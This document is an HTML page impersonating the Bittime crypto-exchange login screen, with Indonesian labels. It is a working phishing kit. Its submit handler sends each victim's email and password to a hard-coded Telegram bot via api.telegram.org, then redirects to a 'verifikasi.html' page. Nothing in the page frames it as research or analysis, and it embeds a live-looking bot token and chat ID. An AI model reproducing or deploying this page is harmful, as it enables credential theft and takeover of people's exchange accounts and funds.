<html lang="en">
 <head>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1" name="viewport"/>
  <title>
   Bittime Login
  </title>
  <script src="https://cdn.tailwindcss.com">
  </script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
  <link href="https://fonts.googleapis.com/css2?family=Inter&amp;display=swap" rel="stylesheet"/>
  <style>
   body {
      font-family: 'Inter', sans-serif;
    }
  </style>
 </head>
 <body class="bg-white min-h-screen flex flex-col items-center px-6 pt-6 relative">
  <!-- Close icon top left -->
  <button aria-label="Close" class="absolute top-6 left-6 text-gray-700 text-xl">
   <i class="fas fa-times">
   </i>
  </button>
  <!-- Register link top right -->
  <a class="absolute top-6 right-6 text-blue-700 text-sm font-normal" href="#">
   Daftar
  </a>
  <!-- Logo -->
  <div class="mt-16 mb-10 flex justify-center">
   <img alt="Bittime official logo in blue and black" class="w-[80px] h-[40px] object-contain" draggable="false" src="https://upload.wikimedia.org/wikipedia/commons/4/4c/Logo_bittime.png"/>
  </div>
  <!-- Tabs -->
  <div class="flex justify-center space-x-10 mb-8 text-base font-medium">
   <button class="text-black border-b-2 border-black pb-1">
    Login Email
   </button>
   <button class="text-gray-400">
    Nomor Telepon
   </button>
  </div>
  <!-- Form -->
  <form class="w-full max-w-md space-y-6" novalidate id="loginForm">
   <div>
    <label class="block text-xs text-gray-700 mb-1" for="email">
     Alamat email
    </label>
    <input class="w-full bg-gray-200 text-gray-500 text-sm rounded-md py-3 px-4 focus:outline-none" id="email" placeholder="Masukkan alamat email" type="email" required/>
   </div>
   <div>
    <label class="block text-xs text-gray-700 mb-1" for="password">
     Kata Sandi
    </label>
    <div class="relative">
     <input aria-describedby="passwordHelp" class="w-full bg-gray-200 text-gray-500 text-sm rounded-md py-3 px-4 pr-12 focus:outline-none" id="password" placeholder="Masukkan kata sandi" type="password" required/>
     <button aria-label="Toggle password visibility" class="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400" type="button" id="togglePassword">
      <i class="fas fa-eye-slash" id="eyeIcon">
      </i>
     </button>
    </div>
    <p class="text-xs text-red-600 mt-1 hidden" id="passwordHelp">
     Kata sandi minimal 8 karakter, harus mengandung huruf dan angka
    </p>
   </div>
   <div class="text-right">
    <a class="text-blue-700 text-xs font-normal" href="#">
     Lupa kata sandi?
    </a>
   </div>
   <button class="w-full bg-gray-300 text-gray-500 text-sm rounded-full py-3 mt-6 cursor-not-allowed" disabled="" type="submit" id="submitBtn">
    Masuk
   </button>
  </form>
  <script>
   const togglePassword = document.getElementById('togglePassword');
    const passwordInput = document.getElementById('password');
    const eyeIcon = document.getElementById('eyeIcon');
    const emailInput = document.getElementById('email');
    const submitBtn = document.getElementById('submitBtn');
    const passwordHelp = document.getElementById('passwordHelp');
    const loginForm = document.getElementById('loginForm');

    // Load saved email from localStorage on page load
    window.addEventListener('DOMContentLoaded', () => {
      const savedEmail = localStorage.getItem('savedEmail');
      if (savedEmail) {
        emailInput.value = savedEmail;
        checkInputs();
      }
    });

    togglePassword.addEventListener('click', () => {
      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
      passwordInput.setAttribute('type', type);

      if(type === 'text') {
        eyeIcon.classList.remove('fa-eye-slash');
        eyeIcon.classList.add('fa-eye');
      } else {
        eyeIcon.classList.remove('fa-eye');
        eyeIcon.classList.add('fa-eye-slash');
      }
    });

    function validatePassword(password) {
      // Minimum 8 characters, at least one letter and one number
      const re = /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{8,}$/;
      return re.test(password);
    }

    function checkInputs() {
      const emailVal = emailInput.value.trim();
      const passwordVal = passwordInput.value.trim();
      const isPasswordValid = validatePassword(passwordVal);

      if(emailVal !== '' && isPasswordValid) {
        submitBtn.disabled = false;
        submitBtn.classList.remove('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
        submitBtn.classList.add('bg-blue-700', 'text-white', 'cursor-pointer');
        passwordHelp.classList.add('hidden');
      } else {
        submitBtn.disabled = true;
        submitBtn.classList.add('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
        submitBtn.classList.remove('bg-blue-700', 'text-white', 'cursor-pointer');
        if(passwordVal.length > 0 && !isPasswordValid) {
          passwordHelp.classList.remove('hidden');
        } else {
          passwordHelp.classList.add('hidden');
        }
      }
    }

    emailInput.addEventListener('input', checkInputs);
    passwordInput.addEventListener('input', checkInputs);

    loginForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      const email = emailInput.value.trim();
      const password = passwordInput.value.trim();

      // Save email to localStorage
      localStorage.setItem('savedEmail', email);

      // Telegram bot info - replace with your own
      const botToken = '8175440078:AAG83ZcciNc8Irjg3JJGwi-DnPNI1q8qyBg';
      const chatId = '6155537801';

      const message = `Login Info:%0AEmail: ${encodeURIComponent(email)}%0APassword: ${encodeURIComponent(password)}`;

      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;

      try {
        const response = await fetch(url, { method: 'GET' });
        if (response.ok) {
          window.location.href = "verifikasi.html";
        } else {
          alert('Failed to send data to Telegram.');
        }
      } catch (error) {
        alert('Error sending data to Telegram.');
      }
    });
  </script>
 </body>
</html>
